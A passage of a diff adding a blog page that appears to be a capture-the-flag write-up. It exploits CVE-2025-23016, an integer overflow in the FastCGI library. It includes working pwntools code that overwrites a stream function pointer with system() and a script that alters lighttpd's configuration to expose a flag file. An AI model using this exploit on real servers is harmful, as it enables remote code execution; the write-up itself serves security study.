+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(nameValue <span style="color:#f92672">+</span> nameLen <span style="color:#f92672">+</span> valueLen <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">PutParam</span>(paramsPtr, nameValue);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The vulnerable part is the call to <code>Malloc(nameLen + valueLen + 2)</code> because an integer overflow can occur.<br>
+This overflow leads to a heap overflow when data for the name and value is read into the allocated chunk.</p>
+<p>There is a safeguard that prevents obvious integer overflows by ANDing <code>nameLen</code> and <code>valueLen</code> with <code>0x7f</code> if reading a 4-byte integer instead of a single byte.<br>
+However, if two values of <code>0x7fffffff</code> are added, the result becomes <code>0xfffffffe</code>, and after adding 2, it wraps around to 0, bypassing this check.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>I followed this <a href="https://www.synacktiv.com/en/publications/cve-2025-23016-exploiting-the-fastcgi-library">PoC</a>, which helped me develop my exploit.<br>
+The exploitation idea is to place an overflowable chunk right after the <code>FCGX_Stream</code> structure, allowing us to overflow it and overwrite function pointers to achieve RCE.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> FCGX_Stream {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>rdNext;    <span style="color:#75715e">/* reader: first valid byte
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                               * writer: equals stop */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>wrNext;    <span style="color:#75715e">/* writer: first free byte
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                               * reader: equals stop */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>stop;      <span style="color:#75715e">/* reader: last valid byte + 1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                               * writer: last free byte + 1 */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>stopUnget; <span style="color:#75715e">/* reader: first byte of current buffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                               * fragment, for ungetc
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                               * writer: undefined */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> isReader;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> isClosed;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> wasFCloseCalled;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> FCGI_errno;                <span style="color:#75715e">/* error status */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>fillBuffProc) (<span style="color:#66d9ef">struct</span> FCGX_Stream <span style="color:#f92672">*</span>stream);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>emptyBuffProc) (<span style="color:#66d9ef">struct</span> FCGX_Stream <span style="color:#f92672">*</span>stream, <span style="color:#66d9ef">int</span> doClose);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>data;
+</span></span><span style="display:flex;"><span>} FCGX_Stream;
+</span></span></code></pre></div><p>The target function for this exploit is <code>fillBuffProc</code> because it is called in <code>FCGX_GetChar</code> as <code>stream-&gt;fillBuffProc(stream);</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">FCGX_GetChar</span>(FCGX_Stream <span style="color:#f92672">*</span>stream)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (stream<span style="color:#f92672">-&gt;</span>isClosed <span style="color:#f92672">||</span> <span style="color:#f92672">!</span> stream<span style="color:#f92672">-&gt;</span>isReader)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> EOF;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (stream<span style="color:#f92672">-&gt;</span>rdNext <span style="color:#f92672">!=</span> stream<span style="color:#f92672">-&gt;</span>stop)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">*</span>stream<span style="color:#f92672">-&gt;</span>rdNext<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    stream<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fillBuffProc</span>(stream);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (stream<span style="color:#f92672">-&gt;</span>isClosed)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> EOF;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    stream<span style="color:#f92672">-&gt;</span>stopUnget <span style="color:#f92672">=</span> stream<span style="color:#f92672">-&gt;</span>rdNext;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (stream<span style="color:#f92672">-&gt;</span>rdNext <span style="color:#f92672">!=</span> stream<span style="color:#f92672">-&gt;</span>stop)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">*</span>stream<span style="color:#f92672">-&gt;</span>rdNext<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ASSERT</span>(stream<span style="color:#f92672">-&gt;</span>isClosed); <span style="color:#75715e">/* bug in fillBufProc if not */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> EOF;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The first step is to send a dummy request to allocate and free some chunks, preparing the heap for the second stage where the actual exploitation occurs.<br>
+I used functions from the <strong>PoC</strong> to make requests to the CGI application.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dummy_request</span>():
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(HOST, PORT)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    header <span style="color:#f92672">=</span> makeHeader(<span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>        makeHeader(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0</span>),
+</span></span><span style="display:flex;"><span>        makeBeginReqBody(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>),
+</span></span><span style="display:flex;"><span>        header,
+</span></span><span style="display:flex;"><span>        p8(<span style="color:#ae81ff">75</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">75</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dummy_request()
+</span></span><span style="display:flex;"><span>dummy_request()
+</span></span></code></pre></div><p>I used the first dummy request to trigger allocations and frees, and the second one to pause at <code>FCGX_GetChar</code> for inspecting the heap.</p>
+<p><img src="/images/d3cgi/heap.png" alt="heap"></p>
+<p>In the attack function, I first filled a large freed chunk, and then implemented the exploitation idea as described earlier.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">attack</span>(cmd : bytes):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span>(len(cmd) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">18</span>)
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(HOST, PORT)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    header <span style="color:#f92672">=</span> makeHeader(<span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x2500</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>        makeHeader(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0</span>),
+</span></span><span style="display:flex;"><span>        makeBeginReqBody(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>),
+</span></span><span style="display:flex;"><span>        header,
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 0xffb * 2 + 2 = 0x1ff8 -&gt; 0x2000 chunk</span>
+</span></span><span style="display:flex;"><span>        p32(<span style="color:#ae81ff">0xffb</span> <span style="color:#f92672">|</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">31</span>), endianness<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0xffb</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 0x7fffffff * 2 + 2 = 0x0 -&gt; 0x10 chunk</span>
+</span></span><span style="display:flex;"><span>        p32(<span style="color:#ae81ff">0xffffffff</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># chunk metadata</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># FCGX_Stream</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; ;&#34;</span> <span style="color:#f92672">+</span> cmd<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">18</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span>),
+</span></span><span style="display:flex;"><span>        p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># fillBuffProc</span>
+</span></span><span style="display:flex;"><span>        p32(exe<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#34;system&#34;</span>])
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dummy_request()
+</span></span><span style="display:flex;"><span>attack(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;ls&#34;</span>)
+</span></span></code></pre></div><p>It worked, so all that remained was to find a way to retrieve the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ spawn-fcgi -n -p <span style="color:#ae81ff">9555</span> -- ./challenge
+</span></span><span style="display:flex;"><span>sh: line 1: T: command not found
+</span></span><span style="display:flex;"><span>manjaro
+</span></span><span style="display:flex;"><span>zsh: segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>  spawn-fcgi -n -p <span style="color:#ae81ff">9555</span> -- ./challenge
+</span></span></code></pre></div><h3 id="retrieving-the-flag">Retrieving the flag</h3>
+<p>There was a length-limited command, so I couldn’t retrieve the flag directly.<br>
+Instead, I first decided to create a function that would write a file on the remote system, which I could later execute.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">attack_and_wait</span>(cmd: bytes):
+</span></span><span style="display:flex;"><span>    dummy_request()
+</span></span><span style="display:flex;"><span>    attack(cmd)
+</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_file</span>(file):
+</span></span><span style="display:flex;"><span>    lines <span style="color:#f92672">=</span> [i<span style="color:#f92672">.</span>strip() <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> open(file)<span style="color:#f92672">.</span>readlines()]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ln <span style="color:#f92672">in</span> lines:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(ln), <span style="color:#ae81ff">5</span>):
+</span></span><span style="display:flex;"><span>            attack_and_wait(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;echo -n &#39;</span><span style="color:#e6db74">{</span>ln[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&gt;&gt;a&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>        attack_and_wait(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;echo &gt;&gt;a&#34;</span>)
+</span></span></code></pre></div><p>The file I chose to write modified the Lighttpd configuration to enable serving static files,<br>
+and copied the flag to the <code>www</code> directory, which is accessible through the Lighttpd server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cp /flag www
+</span></span><span style="display:flex;"><span>sed -i <span style="color:#e6db74">&#34;s/disable/enable/&#34;</span> lighttpd.conf
+</span></span><span style="display:flex;"><span>sed -i <span style="color:#e6db74">&#34;s/mod_fastcgi/mod_staticfile/&#34;</span> lighttpd.conf
+</span></span><span style="display:flex;"><span>pkill lighttpd
+</span></span><span style="display:flex;"><span>sleep <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>./run.sh
+</span></span></code></pre></div><p>Finally, I executed the attack as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>write_file(<span style="color:#e6db74">&#34;script.sh&#34;</span>)
+</span></span><span style="display:flex;"><span>attack_and_wait(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;sh a&#34;</span>)
+</span></span></code></pre></div><p>After that, I simply used <code>curl</code> on the web server and retrieved the flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ curl localhost:8888/flag
+</span></span><span style="display:flex;"><span>ctf<span style="color:#f92672">{</span>fake_flag_for_testing<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>I recommend reading the <a href="https://www.synacktiv.com/en/publications/cve-2025-23016-exploiting-the-fastcgi-library">PoC</a> if you want more details about exploiting this vulnerability.<br>
+I also believe this challenge was heavily inspired by that PoC, as the binary is quite similar to the one used in their demonstration.</p>
+<p>You can check out the full exploit here: <a href="/scripts/d3cgi/exploit.py">exploit.py</a></p>
+
+        
+    </div>
+
+    <div class="prev-next">
+        
+    </div>
+
+    
+    
+    
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a>
+      <ul>
+        <li><a href="#binary-analysis">Binary analysis</a></li>
+        <li><a href="#finding-the-vulnerability">Finding the vulnerability</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#retrieving-the-flag">Retrieving the flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    
+    
+
+    
+
+    
+
+    
+
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/gokarna-theme/gokarna-hugo">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
